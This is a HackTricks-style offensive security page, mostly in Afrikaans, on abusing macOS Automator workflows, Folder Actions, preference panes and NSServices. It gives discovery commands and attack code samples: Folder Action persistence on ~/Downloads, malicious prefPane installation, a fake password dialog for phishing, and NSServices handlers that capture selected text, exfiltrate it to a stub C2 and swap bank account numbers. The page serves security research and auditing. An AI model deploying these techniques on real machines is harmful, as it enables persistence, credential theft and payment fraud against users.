# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basiese Inligting

**Automator** is macOS se visuele automation tool. Dit voer **workflows** (`.workflow` bundles) uit wat uit **actions** (`.action` bundles) bestaan. Automator dryf ook **Folder Actions**, **Quick Actions** en **Shortcuts**-integrasie aan. Op moderne macOS kan workflows ook in **Shortcuts** **ingevoer** word, sodat dieselfde malicious logic as 'n Finder Quick Action, 'n user service onder `~/Library/Services/`, of 'n shortcut wat deur legacy Automator actions ondersteun word, kan verskyn.

Automator actions is **plugins** wat in die Automator runtime gelaai word wanneer 'n workflow uitgevoer word. Hulle kan:
- Arbitrêre shell scripts uitvoer
- Files en data verwerk
- Met applications deur middel van AppleScript interaksie hê
- Saamgevoeg word vir komplekse automation

### Waarom Dit Belangrik Is

> [!WARNING]
> Automator workflows kan deur middel van **social engineering** laat uitvoer word — hulle lyk soos eenvoudige document files. 'n `.workflow` bundle kan ingebedde shell commands bevat wat uitgevoer word wanneer die workflow loop. In kombinasie met Folder Actions bied hulle **automatic persistence** wat deur file events geaktiveer word. Onlangse Gatekeeper-fixes het ook getoon dat **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) as executable content, en nie as onskadelike data nie, behandel moet word.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Aanval: Social-Engineered Workflow

’n `.workflow`-bundle lyk vir die meeste gebruikers soos ’n normale dokumentlêer:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Aanval: Folder Action Persistence

Folder Actions voer outomaties ’n workflow uit wanneer lêers by ’n gemonitorde vouer gevoeg word:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bly voortbestaan na herbegin en word stilweg uitgevoer. ’n Folder Action op `~/Downloads` beteken **elke afgelaaide lêer aktiveer jou payload** — insluitend lêers vanaf Safari, Chrome, AirDrop en e-posaanhegsels. Let ook daarop dat `System Events` Folder Actions kan registreer wat na scripts buite die verstekliggings `~/Library/Scripts/Folder Action Scripts` wys, wat dit die moeite werd maak om na los paaie te soek. Vir verwante TCC-implikasies, kyk na [die TCC-bladsy](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basiese Inligting

Preference panes (`.prefPane`-bundels) is plugins wat deur **System Settings** (voorheen System Preferences) gelaai word. Hulle verskaf konfigurasie-koppelvlakpanele vir stelsel- of derdepartyfunksies. Op ouer stelsels is hulle direk deur `System Preferences` gelaai; op nuwer weergawes word derdeparty-panes gewoonlik deur ’n **legacy loader XPC service** hanteer wat vanaf System Settings begin word.

### Waarom Dit Belangrik Is

- Preference panes word uitgevoer in ’n **trusted host process** wat deur System Settings / System Preferences voortgebring word
- Op moderne stelsels kan daardie host ’n **`legacyLoader` XPC service** wees, dus bly die belangrike grens steeds **trusted Apple UI process -> third-party code loading**
- Derdeparty-preference panes erf die **host process security context** en gebruikerstrust wat aan daardie UI gekoppel is
- Gebruikers installeer preference panes deur daarop te **dubbelklik** — maklike social engineering
- Sodra dit geïnstalleer is, **bly dit voortbestaan** en word dit gelaai elke keer wanneer System Settings na daardie paneel oopgemaak word

### Ontdekking
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

'n Kwaadwillige voorkeurspaneel erf die **pane host** se sekuriteitskonteks (histories `System Preferences`; in nuwer weergawes dikwels 'n `legacyLoader`-helper wat deur `System Settings` geloods word):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Aanval: Volharding via Installasie
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

'n Voorkeurpaneel kan wettige stelsel-UI-panele naboots om vir **credentials te phish**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basiese Inligting

**NSServices** laat toepassings toe om funksionaliteit aan ander apps deur die **Services-menu** (regs-kliek → Services) te verskaf. Wanneer 'n gebruiker teks of data kies en 'n service aanroep, word die gekose data **aan die service provider gestuur** vir verwerking.

Services word in 'n toepassing se `Info.plist` onder die `NSServices`-sleutel verklaar en by die pasteboard server (`pbs`) geregistreer. macOS hou ook 'n **service cache** en 'n **restriction policy** wat bepaal watter services sigbaar is en of sandboxed callers 'n ekstra waarskuwing moet ontvang.

### Waarom Dit Belangrik Is

- Services ontvang **cross-application data flow** — gekose teks vanuit enige toepassing word na die service gestuur
- 'n Kwaadwillige service vang data van password managers, e-poskliënte en finansiële apps vas
- Services kan **gewysigde data** aan die aanroepende toepassing terugstuur (man-in-the-middle op selection operations)
- Servicename kan geskep word om wettig voor te kom ("Format Text", "Encrypt Selection", "Share")
- Die opsionele `NSRestricted`-flag is sekuriteitsrelevant: 'n service wat as unrestricted gemerk is, kan deur 'n sandboxed app aangeroep word sonder die waarskuwing wat macOS vir services wat tot escapes kan lei, vertoon<sup>[[2]](#references)</sup>

### Ontdekking
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Aanval: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Aanval: Data Modification (Man-in-the-Middle)

'n Diens kan die **teruggestuurde data wysig** terwyl dit voorkom asof dit 'n wettige funksie verskaf:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Beperkte Dienste en Moderne Misbruik

Apple supports an optional `NSRestricted` boolean per service definition. If it is set, macOS warns sandboxed callers because the service may help them **escape sandbox or privacy boundaries**. From an offensive perspective, this gives two useful audit paths:

- Look for **third-party services not marked as restricted** even though they proxy Apple Events, file access, or other privileged actions
- Look for **high-value built-in services** with strong entitlements (for example, services exposed by Script Editor or Finder-backed helpers) and check whether user interaction is enough to turn them into a data-access primitive

A good recent example is **CVE-2022-48574**, where the Services mechanism could be abused to reach **TCC-protected user files without the expected confirmation flow**. The bug is fixed, but the technique remains useful for threat modeling: any service that forwards file access or automation requests on behalf of the caller deserves the same scrutiny.<sup>[[2]](#references)</sup>

---

## Onlangse Security Notes

- **Quick Actions are executable content**: Apple fixed a Gatekeeper bypass in 2024 where an app-bundled Automator Quick Action could run without normal assessment. When auditing apps, inspect `Contents/PlugIns/*.workflow/Contents/document.wflow` exactly like you would inspect helper scripts or login items. See [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts can inherit legacy Automator behavior**: Apple also added an additional user-consent prompt after third-party shortcuts were found using a **legacy Automator action** to send Apple Events without the expected permission flow. Imported workflows and shortcut bundles should be reviewed for `Run AppleScript`, `Run Shell Script`, and similar bridge actions. See [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple shipped another Automator fix in 2025 for access to protected user data. Even if Automator is a legacy surface, treat any workflow runner, Quick Action host, or automation bridge as a current attack surface rather than dead code.

---

## Aanvalskettings oor Tegnieke Heen

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Voorkeurpaneel → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Diefstal uit Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Verwysings

- [1] [Apple — Oor die sekuriteitsinhoud van macOS Ventura 13.7, Sonoma 14.7 en Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Hoe die NSServices-exploit op macOS gewerk het](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
